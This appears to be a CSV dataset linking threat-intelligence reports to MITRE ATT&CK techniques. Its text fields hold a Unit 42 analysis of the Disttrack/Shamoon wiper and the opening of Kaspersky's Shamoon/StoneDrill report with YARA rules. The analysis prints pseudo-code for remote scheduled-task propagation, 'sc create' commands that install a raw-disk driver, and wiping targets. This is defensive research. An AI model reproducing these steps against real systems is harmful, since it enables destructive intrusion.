url,mitre_domain,tactic_name,tech_name,tech_id,text,software_id
After disabling UAC, the dropper connects to the remote system (using NetUseAdd) and logs in using the embedded stolen credentials. The dropper then checks to see if it has administrator privileges on the remote system by attempting to open ""\system32\csrss.exe"", which allows it to determine if it can write its payload to the ""\system32"" folder on the remote system. The dropper then has two different methods in which it can pivot to the remote system.
The first method involves the dropper writing itself to ""\system32\ntssrvr32.exe"" on the remote system. After writing itself to the remote system, the dropper creates a service named ""ntssrv"", with a display name of ""Microsoft Network Realtime Inspection Service"" and a description of ""Helps guard against time change attempts targeting known and newly discovered vulnerabilities in network time protocols"" to execute the payload.
The second, alternative method also involves the dropper copying itself to ""\system32\ntssrvr32.exe"" on the remote system; however, instead of creating a remote service, this method calls the NetScheduleJobAdd function within the Windows netapi32 library to create a scheduled task to run the payload. Scheduled tasks require a time in which the task will run, which the dropper determines by calling the function NetRemoteTOD to obtain the time of day from the remote system. The dropper then adds 90 seconds to the time of day value on the remote system and uses this value as the ""JobTime"" to run the task in three minutes, which executes the payload on the remote system. The following pseudo-code shows the scheduled task creation process:
NetRemoteTOD(UncServerName, &BufferPtr)
NetApiBufferAllocate(0x10u, &AT_INFO)
AT_INFO->Command = s_pathToPayload;
AT_INFO->JobTime = 1000
* (BufferPtr->tod_secs
+ 60 * (BufferPtr->tod_mins + 60 * BufferPtr->tod_hours - BufferPtr->tod_timezone)
+ 90);
AT_INFO->Flags = JOB_NONINTERACTIVE;
AT_INFO->DaysOfMonth = 0;
AT_INFO->DaysOfWeek = 0;
NetScheduleJobAdd(UncServerName, AT_INFO, &v16)
1234567891011
NetRemoteTOD(UncServerName, &BufferPtr)NetApiBufferAllocate(0x10u, &AT_INFO)AT_INFO->Command = s_pathToPayload;AT_INFO->JobTime = 1000 * (BufferPtr->tod_secs
+ 60 * (BufferPtr->tod_mins + 60 * BufferPtr->tod_hours - BufferPtr->tod_timezone)
+ 90);AT_INFO->Flags = JOB_NONINTERACTIVE;AT_INFO->DaysOfMonth = 0;AT_INFO->DaysOfWeek = 0;NetScheduleJobAdd(UncServerName, AT_INFO, &v16)
C2 Communications
Disttrack extracts the communication component from its resource named “PKCS7”, decrypts it and saves the resulting cleartext to the file %WINDOWS%\system32\netinit.exe.
The communication module interacts with its C2 server using HTTP requests. The communications modules in both the x86 and x64 variants of Disttrack we analyzed were configured to use “1.1.1.1:8080” for its C2 server, which does not host an operational Disttrack C2 server. The lack of an operational C2 server suggests that the threat actors did not desire remote access to infected systems, rather the actors sought to render them unusable instead. If the modules were configured with an operational C2 server,
the module would generate an HTTP GET request that resembles the following:
The interesting part of the request above is that the host ""server"", the URL ""category/page.php"", the parameter ""shinu"" and the user-agent ""Mozilla/5.0 (MSIE 7.1; Windows NT 6.0)"" are hardcoded into the tool. The data in ""shinu"" parameter is a combination of the system's tickcount, local IP address, operating system version, keyboard layout and the contents of %WINDOWS%\inf\netimm173.pnf. The C2 server can respond to this HTTP request with one of the following two commands:
Command
Description
E
Provides an executable to run on the system. The executable is saved to %TEMP%\Temp\filer\<tickcount>.exe
T
Sets the time to start wiping the system, by writing the date to %WINDOWS%\inf\usbvideo324.pnf.
We believe the HTTP host value of ""server"" and the non-operational ""1.1.1.1"" C2 address may suggest that the communication module is created with a builder tool, which in this case the actor mistakenly or purposefully did not provide an active C2 server when building this module. While completely speculative, the word “shinu” used as a parameter could be a reference to the Arabic slang for the word “what”, as well as a reference to a village name in northwestern Iran.
Disttrack Data Destruction
The Disttrack dropper is responsible for installing the wiper component of this Trojan, however, it will only activate this component if the system time is greater than a preset date. The dropper obtains a date used to activate the wiping functionality by reading a specific file, or using a hardcoded timestamp of ""2016/11/17 20:45"". The file containing this timestamp is named ""\inf\usbvideo324.pnf"", which is not initially installed but is provided by the C2 server if it sends the communications module the ""T"" command. The ""usbvideo324.pnf"" file would have the following structure:
BYTE year;
BYTE month;
BYTE day;
BYTE hour;
BYTE year;
BYTE minute;
If the dropper determines the system date is larger than the specified date, the dropper will extract the wiper component from a resource named ""PKCS12"" and save it to the ""system32"" folder with one of the following filenames appended with a "".exe"" extension:
caclsrv
certutl
clean
ctrl
dfrag
dnslookup
dvdquery
event
findfile
gpget
ipsecure
iissrv
msinit
ntfrsutil
ntdsutl
power
rdsadmin
regsys
sigver
routeman
rrasrv
sacses
sfmsc
smbinit
wcscript
ntnw
netx
fsutl
extract
The dropper then runs the wiper component with a command line argument of ""1"". The wiper component extracts a driver from its resource section and decrypts it with a 226 byte XOR key. The wiper saves the extracted driver to ""C:\Windows\System32\Drivers\drdisk.sys"" and installs the kernel driver by creating a service named ""drdisk"" with the following command line commands:
sc create drdisk type= kernel start= demand binpath=
System32\Drivers\drdisk.sys 2>&1 >nul
sc start drdisk 2>&1 >nul
123
sc create drdisk type= kernel start= demand binpath= System32\Drivers\drdisk.sys 2>&1 >nulsc start drdisk 2>&1 >nul
The kernel driver is a commercial product that the attackers are abusing called RawDisk by EldoS Corporation, which provides direct access to files, disks and partitions. It appears that the “drdisk.sys” driver (SHA256: 4744df6ac02ff0a3f9ad0bf47b15854bbebb73c936dd02f7c79293a2828406f6) is the exact same driver as used in the Shamoon attack in 2012. With the kernel driver installed, the wiper can begin writing to protected system locations, such as the master boot record (MBR) and partition tables of storage volumes. The wiper can be configured to overwrite files in three different ways, specified by a configuration setting of ""F"", ""R"" or ""E"". If configured with the ""F"" setting, the wiper loads a resource named AJKEOA, which extracts a JPEG image to use to overwrite files and partition tables. If the wiper is configured with the ""E"" setting, the wiper will encrypt the contents of the file using a random value as a key and the RC4 algorithm. If configured with the ""R"" setting, the wiper will overwrite files with the random values that would be used as a key in ""E"".
The sample we analyzed was configured with ""F"", meaning it would overwrite files with an image obtained from its resource section. The image extracted is a picture of a Syrian boy named Alan Kurdi, whose drowning on September 2, 2015 received international attention in regards to the ongoing Syrian refugee crisis. The previous Shamoon attack in 2012 used an image of a burning American flag, continuing the political image theme.
From a functionality standpoint, the wiper relies on EldoS' RawDisk driver to overwrite files on the system. During this activity, we noticed the wiper changing the system time to August 2012, as the temporary license key for the RawDisk driver requires the system time to not exceed the month of August, which is when the temporary license would expire. This modification to the system time was seen in the previous campaign, and the temporary license key within the wiper component is the exact same as wiper component from the 2012 attacks. The wiper itself queries the following registry keys to obtain a list of partitions to overwrite:
HKLM\SYSTEM\CurrentControlSet\Control\FirmwareBootDevice
HKLM\SYSTEM\CurrentControlSet\Control\SystemBootDevice
12
HKLM\SYSTEM\CurrentControlSet\Control\FirmwareBootDeviceHKLM\SYSTEM\CurrentControlSet\Control\SystemBootDevice
In addition to these partitions, the wiper attempts to overwrite files and subfolders within in the following folders:
C:\Documents and Settings
C:\Users
C:\Windows\System32\Drivers
C:\Windows\System32\Config\systemprofile
1234
C:\Documents and SettingsC:\UsersC:\Windows\System32\DriversC:\Windows\System32\Config\systemprofile
After overwriting these files and the partition tables, the wiper issues the following command to restart the system:
shutdown -r -f -t 2
1
shutdown -r -f -t 2
The arguments and switches used in the “shutdown” command above forces all running applications to close and causes the system to reboot (‘-r’) after 2 seconds (‘-t 2’). This command does result in a dialog prompt, seen in Figure 1, that informs the user that the system is shutting down.
Figure 1 Dialog prompt displayed when the Wiper component runs the 'shutdown' command
With the partition tables overwritten, the system will no longer be able to properly boot, which renders the system unusable. During analysis, our analysis system was rendered unusable, as the virtual machine was unable to find the operating system during boot up, as seen in Figure 2.
Figure 2 Analysis virtual machine unable to boot after executing Disttrack Wiper
Conclusion
After a four year hiatus, threat actors likely associated with the Shamoon attack campaign have used their Disttrack malware to target at least one organization in Saudi Arabia. The current attack campaign has several TTP overlaps with the original Shamoon campaign, especially from a targeting and timing perspective. Also, Disttrack malware used in the recent attacks is very similar to the variant used in the 2012 attacks, which uses the exact same RawDisk device driver as well (down to the same, temporary license key).. The main purpose of the Disttrack malware is to overwrite files and storage partitions in an attempt to destroy data and render the system unusable. To maximize its destruction, the Disttrack tool attempts to spread to other systems on the network using stolen administrator credentials, which suggests that the threat actors had previous access to the network or carried out successful phishing attacks prior to the attack using Disttrack.
Palo Alto Networks customers are protected from Disttrack:
All known samples have a malicious verdict in WildFire
AutoFocus customers can monitor Disttrack activity via the Disttrack tag
Indicators of Compromise
Disttrack Droppers
47bb36cd2832a18b5ae951cf5a7d44fba6d8f5dca0a372392d40f51d1fe1ac34 (x64)
394a7ebad5dfc13d6c75945a61063470dc3b68f7a207613b79ef000e1990909b
(x86)
Communication Components
772ceedbc2cacf7b16ae967de310350e42aa47e5cef19f4423220d41501d86a5 (x64)
61c1c8fc8b268127751ac565ed4abd6bdab8d2d0f2ff6074291b2d54b0228842 (x86)
Wiper Components
c7fc1f9c2bed748b50a599ee2fa609eb7c9ddaeb9cd16633ba0d10cf66891d8a (x64)
128fa5815c6fee68463b18051c1a1ccdf28c599ce321691686b1efa4838a2acd (x86)
EldoS RawDisk Samples
5a826b4fa10891cf63aae832fc645ce680a483b915c608ca26cedbb173b1b80a (x64)
4744df6ac02ff0a3f9ad0bf47b15854bbebb73c936dd02f7c79293a2828406f6 (x86)
Get updates from
Palo Alto Networks!
Sign up to receive the latest news, cyber threat intelligence and research from us
Please enter your email address!
Please mark, I'm not a robot!
By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement.
Popular ResourcesResource Center
Blog
Communities
Tech Docs
Unit 42
Sitemap
Legal NoticesPrivacy
Terms of Use
Documents
AccountManage Subscriptions
Report a Vulnerability
© 2022 Palo Alto Networks, Inc. All rights reserved.
",[]
https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/07180722/Report_Shamoon_StoneDrill_final.pdf,"['enterprise-attack', 'Enterprise']",['impact'],"['Disk Structure Wipe', 'Data Destruction', 'Disk Structure Wipe', 'Command and Scripting Interpreter: Visual Basic', 'Data Destruction', 'Indicator Removal on Host: File Deletion', 'Ingress Tool Transfer', 'Obfuscated Files or Information', 'Process Injection', 'Query Registry', 'Screen Capture', 'Software Discovery: Security Software Discovery', 'System Information Discovery', 'System Time Discovery', 'Virtualization/Sandbox Evasion', 'Windows Management Instrumentation']","['T1487', 'T1485', 'T1561.002', 'T1059', 'T1485', 'T1070', 'T1105', 'T1027', 'T1055', 'T1012', 'T1113', 'T1518', 'T1082', 'T1124', 'T1497', 'T1047', 'T1059', 'T1485', 'T1070', 'T1105', 'T1027', 'T1055', 'T1012', 'T1113', 'T1518', 'T1082', 'T1124', 'T1497', 'T1047', 'T1059', 'T1485', 'T1070', 'T1105', 'T1027', 'T1055', 'T1012', 'T1113', 'T1518', 'T1082', 'T1124', 'T1497', 'T1047', 'T1059', 'T1485', 'T1070', 'T1105', 'T1027', 'T1055', 'T1012', 'T1113', 'T1518', 'T1082', 'T1124', 'T1497', 'T1047', 'T1059', 'T1485', 'T1070', 'T1105', 'T1027', 'T1055', 'T1012', 'T1113', 'T1518', 'T1082', 'T1124', 'T1497', 'T1047', 'T1059', 'T1485', 'T1070', 'T1105', 'T1027', 'T1055', 'T1012', 'T1113', 'T1518', 'T1082', 'T1124', 'T1497', 'T1047']","FROM SHAMOON TO STONEDRILL
Wipers attacking Saudi organi zations and beyond
Version 1.05
2017-03-07,
Contact:
intelreports@kaspersky.com
1
Beginning in November 2016, Kaspersky Lab observed a new wave of wiper attacks
directed at
multiple targets in the Middle East. The malware used in the new attacks was a variant of the
infamous
Shamoon
worm that targeted Saudi Aramco and Rasgas back in 2012.
Dormant for four years, one of the most mysterious wipers in history has returned.
So far, we
have
observed three waves of attacks of the Shamoon 2.0 malware, activated on 17
November 2016, 29 Nove
mber 2016 and 23 January 2017.
Also known as Disttrack, Shamoon is a highly destructive malware family that effectively wipes
the victim machine. A group known as the
Cutting Sword of Justice
took credit for the Saudi
Aramco attack by posting a
Pastebin message
on the day of the attack (back in 2012)
,
and
justified the attack as a measure against the Saudi monarchy.
The
Shamoon 2.0 attacks observed
since November 2016 have targeted
organizations in
various critic
al and economic sectors in Saudi Arabia. Just like the previous variant, the
Shamoon 2.0 wiper aims for the mass destruction of systems inside targeted organizations.
The new attacks share
many
similarities with the 2012 wave, though featuring new tools a
nd
techniques. During the first stage, the attackers obtain administrator credentials for the victim’s
network. Next, they build a custom wiper (Shamoon 2.0) which leverages these credentials to
spread wide
ly
inside the organization. Finally, on a predefin
ed date, the wiper activates
,
rendering the victim’s machines completely
inoperable
. It should be noted that the final stages
of the attacks have their activity completely automated, without the need for communication with
the
command and control center.
W
hile
i
nvestigating the Shamoon 2.0 attacks, Kaspersky Lab also discovered a previously
unknown wiper malware which appears to be targeting organizations in Saudi Arabia. We’re
calling this new wiper
StoneDrill
. StoneDrill has several “style” similarities t
o Shamoon
,
with
multiple interesting factors and techniques to allow for
the
better evasion of detection. In
addition to suspected Saudi targets, one victim of StoneDrill was observed on the Kaspersky
Security Network (KSN) in Europe. This makes us believe
the threat actor behind StoneDrill is
expanding
its
wiping operations from the Middle East to Europe.
To summarize some of the characteristics of the new wiper attacks, for both Shamoon and
StoneDrill:
●
Shamoon 2.0 includes a fully functional ransomware mo
dule, in addition to its common
wiping functionality.
●
Shamoon 2.0 has both 32
-
bit and 64
-
bit components
.
●
The Shamoon samples we analyzed in January 2017 do not implement any command
and control (C&C) communication; previous ones included a basic C&C functi
onality that
referenced local servers in the victim’s network.
●
StoneDrill
makes heavy use
of evasion techniques to avoid sandbox execution
.
●
While Shamoon embeds Arabic
-
Yemen resource language sections, StoneDrill embeds
mostly Persian resource language sec
tions. Of course, we do not exclude the possibility
of false flags.
●
StoneDrill does not use drivers during deployment (unlike Shamoon)
but
relies on
memory injection of the wiping module into the victim’s preferred browser.
,
Contact:
intelreports@kaspersky.com
2
●
Several similarities exist between Shamoon and StoneDrill
.
●
Multiple similarities were found between StoneDrill and previously analysed
News
B
eef
attacks
.
What is new
in this report?
This report provides new insights into the Shamoon 2.0 and StoneDrill attacks, including:
1.
The discovery techniques and strategies we used for Shamoon and StoneDrill
.
2.
Details on the ransomware functionality found in Shamoon 2.0. This func
tionality is
currently inactive but could be used in future attacks
.
3.
Details on the
newly found
StoneDrill functions, including
its
destructive capabilities
(even with limited user privileges)
.
4.
Details on
the
similarities between malware styles and malware
components
’
source
code found in Shamoon, StoneDrill and NewsBeef
.
,
Contact:
intelreports@kaspersky.com
3
1. From Shamoon to StoneDrill: the discovery
1.1. Shamoon: It’s all about the “resources”
Few people ever expected the return of Shamoon after
four
years of silence. This made the
news
from the Middle East on 17 November 2016 quite surprising
,
and sent multiple
shock
waves
through the industry. After the second wave of attacks, which took place on 29
November 2016, it became quite clear that Shamoon 2.0 was no longer
an isolated
incident,
but
part of a new series of attacks and
we should
expect more waves coming
in
. In order to make
sure
that
Kaspersky Lab customers
were
protected, we started to develop specific detection
strategies and hunt for possible new variants.
To create the new det
ections, we used multiple ideas:
●
The Shamoon wipers have their additional payloads stored as encrypted resources.
●
Just like in 2012, the early Shamoon 2.0 samples used resources with
three
very
specific names
-
""PKCS7"", ""PKCS12"" and ""X509"". Because of thei
r uniqueness it was
relatively easy to find and detect them just by the resource names
and their
high
entropy. Unfortunately, newer versions had random resource names like ""ICO"", ""LANG""
and ""MENU"", so the ability to easily find new samples was lost.
Howev
er, all programmers, especially malware writers, have their own habits, and the authors
of
Shamoon are no exception:
●
Since the Shamoon 1
.0
story
,
from 2012 (6dd571b84470ad9caad30a6a6acf491e)
until
2016 (2cd0a5f1e9bcce6807e57ec8477d222a) many samples had one
additional
encrypted resource with a specific, although non
-
unique name ""101"".
This finding got us thinking
that
the Shamoon attackers can re
-
use this pattern and we’ve
investigated ways of usi
ng this to hunt for new, unknown malware generations from their side.
As researchers, we tested a lot of different approaches to
find similar malicious
samples based
on this
artefact
, and one of them worked unexpectedly. Here’s the logic we used to create
the
detection:
1.
We assumed that for
the
next waves of attack the authors
would
continue to recompile
the
Shamoon 2
.0
version from 2016, while trying to avoid AV detection, so we focused
mostly on the newest Shamoon versions
.
2.
We assumed that the wiper
would
again enumerate all files inside folders, so it
w
ould
still
call Windows API functions FindFirstFile and FindNextFile
.
3.
Because
it uses
encrypted resources, we assumed that it would find and load them with
the Windows API functions FindResource and LoadReso
urce
.
4.
Inside all known
versions of
Shamoon 2
.0
, the resource ""101"" was found, with the
following properties:
●
Level of entropy > 7.8
-
that means the data inside is encrypted or compressed
.
,
Contact:
intelreports@kaspersky.com
4
●
Size about 30
KB
-
we’ve decided to set the minimum limit at 20 KB
.
●
Language = neutral (not set); all other resources had
the
languages ""Arabic
(Yemen)"" or ""English United States""
.
●
Does not contain an unencrypted PE executable file inside
.
After initial testing, we decided to add more search criteria to limit the number
of possible false
positive detections:
●
Shamoon samples had no digital signature, so the sample would be unsigned
.
●
All known Shamoon samples with resource ""101"" had a maximum file size of 370 KB, so
it's reasonable to limit the file size to twice that numbe
r
-
700 KB.
●
The number of resources inside the sample should not be too high
-
less than 15
.
Our favorite malware hunting tool,
Yara
, provides a rule
-
bused approach to create descriptions of
malware
families based on textual or binary patterns
.
Here’s the detection rule we wrote using all the above conditions:
import ""pe""
import ""math""
rule susp_file_enumerator_with_encrypted_resource_101 {
meta:
copyright = ""Kaspersky Lab""
description = ""Generic
detection for samples that enumerate files with encrypted resource
called 101""
hash = ""2cd0a5f1e9bcce6807e57ec8477d222a""
hash = ""c843046e54b755ec63ccb09d0a689674""
version = ""1.4""
strings:
$mz = ""This program cannot be run in DOS mode.""
$a1 = ""Find
FirstFile"" ascii wide nocase
$a2 = ""FindNextFile"" ascii wide nocase
$a3 = ""FindResource"" ascii wide nocase
$a4 = ""LoadResource"" ascii wide nocase
condition:
uint16(0) == 0x5A4D and
all of them and
filesize < 700000 and
pe.number_of_sections
> 4 and
pe.number_of_signatures == 0 and
pe.number_of_resources > 1 and pe.number_of_resources < 15 and
for any i in (0..pe.number_of_resources
-
1):
(
(math.entropy(pe.resources[i].offset, pe.resources[i].length) > 7.8) and
pe.resources[i].id == 1
01 and
pe.resources[i].length > 20000 and
pe.resources[i].language == 0 and
,
Contact:
intelreports@kaspersky.com
5
not ($mz in (pe.resources[i].offset..pe.resources[i].offset + pe.resources[i].length))
)
}
While running the above Yara rule on Kaspersky
Lab’s
samples selection
,
we
found an
interesting, fresh sample. After a quick analysis, we realized it was yet another wiper
. H
owever,
it was not Shamoon
,
but something different. We’ve decided to call it StoneDrill.
1.2. From StoneDrill to
NewsBeef
Having identified the StoneDrill
sample through the Yara technique above, we started looking
for other possibly related samples.
One Yara technique that
has
proved useful in the past for finding new malware variants is the
development of Yara rules for decrypted malware components. Durin
g attacks, malware
components can be changed to fit the attackers’ requirements
,
so
hunting for decrypted
malware code might help in finding new malware variants or even older samples.
With StoneDrill, we developed several Yara rules for the decrypted payl
oads. Here’s one of our
Yara rules for a decrypted StoneDrill module:
rule StoneDrill_main_sub {
meta:
author
= ""Kaspersky Lab""
description
= ""Rule to detect StoneDrill (decrypted) samples""
hash
= ""d01781f1246fd1b64e09170bd6600fe1""
hash
= ""ac3c25534c076623192b9381f926ba0d""
version
= ""1.0""
strings:
$code = {B8 08 00 FE 7F FF 30 8F 44 24 ?? 68 B4 0F 00 00 FF 15 ?? ?? ?? 00 B8 08 00 FE 7F FF
30 8F 44 24 ?? 8B ?? 24 [1
-
4] 2B ?? 24 [6] F7 ?1 [5
-
12] 00}
condit
ion:
uint16(0) == 0x5A4D and
$code
and
filesize < 5000000
}
Interestingly, this rule allowed us to find a new category of samples, which we previously
connected with a threat actor named News
B
eef. We wrote about
News
B
eef
roughly one year
ago, in relation to another set of attacks against oil and energy companies from the Middle East
.
,
Contact:
intelreports@kaspersky.com
6
Further analysis indicated the malware sam
ples from StoneDrill and News
B
eef appear to be
connected together through numerous internal similarities.
The use of simple logic in conjunction with
a
knowledge of Yara can help attain
a
state
-
of
-
the
-
art
outcome in malware hunting activity. If you would l
ike to learn more, you can join us
for
the Yara
training
""
Hunt APTs with Yara like a GReAT Ninja
""
and the advanced
“
Malware Reverse
Engineering course
”
on April 1
-
